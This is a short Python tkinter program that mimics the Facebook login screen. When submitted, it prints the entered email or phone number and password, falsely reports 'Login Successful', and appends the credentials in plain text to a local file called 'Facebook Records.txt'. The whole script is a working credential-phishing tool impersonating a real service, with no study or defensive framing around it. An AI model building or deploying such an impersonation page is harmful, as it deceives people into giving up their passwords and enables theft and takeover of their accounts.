from tkinter import*
import tkinter.messagebox as msg
def submit():
    email = name.get()
    pwd = Pass.get()

    if len(email)==0 and len(pwd)==0 :
        msg.showerror("Facebook - Login", "Please Enter Data First")

    elif len(email)==0:
        msg.showerror("Facebook - Login", "Please Enter Email or Phone no")
    elif len(pwd)==0:
        msg.showerror("Facebook - Login", "Please Enter Password")
    else :
        print(f"Email  or Phone no. : {email}\npassword : {pwd} ")
        msg.showinfo("Facebook - Login", "Login Successful")

        with open("Facebook Records.txt", "a") as f:
            f.write(f"( Email  or Phone no. : {email} , Password : {pwd} )\n\n")
            f.close()



root = Tk()
root.geometry("530x550")
root.title("Facebook - Login")
root.resizable(False ,False)
photo = PhotoImage(file = "logo.png")
root.iconphoto(False, photo)
root.config(background="white")

f1 = Frame(root, bg="gray",relief=SUNKEN,borderwidth=2)
f1.place(x=105,y=50)



facebook = Label(f1,text="facebook",font=("Helvetica", 50, "bold"),bg="Dodgerblue3",fg="white",padx=10)
facebook.pack(fill="x")


Name = Label(root,text="Email or Phone No.",font=("Copperplate", 15),fg="Black",bg="white")
Name.place(x=115,y=200)
password = Label(root,text="Password",font=("Copperplate", 15 ),fg="Black",bg="white")
password.place(x=115,y=290)

name =StringVar()
Pass = StringVar()

nameent = Entry(root,textvariable=name,font=("Arial", 11),relief=RAISED)
nameent.place(x=115,y=240,width=300, height=30)
passent = Entry(root,textvariable=Pass,show=".",font=("Arial", 20,"bold"),relief=RAISED)
passent.place(x=115,y=320,width=300, height=30)

f2 = Frame(root, bg="white")
f2.place(x=112,y=350)


button = Button(f2,text="Log in",padx=115,pady=5,bg="DodgerBlue2",fg="white",font=("Copperplate", 15, "bold"),command=submit)
button.pack(pady=20,fill=X)

info = Label(root,text="don't have an acount",bg="white").place(x=112,y=465)
info = Label(root,text="Sign in",bg="white",fg="Dodgerblue3",font=("Copperplate", 10, "bold")).place(x=230,y=465)
info = Label(root,text="____________________________________________",bg="white",fg="black",font=("Copperplate", 10, "bold")).place(x=110,y=440)
info = Label(root,text="Forgottoen password?",bg="white",fg="Dodgerblue3",font=("Copperplate", 10, )).place(x=200,y=430)




root.mainloop()

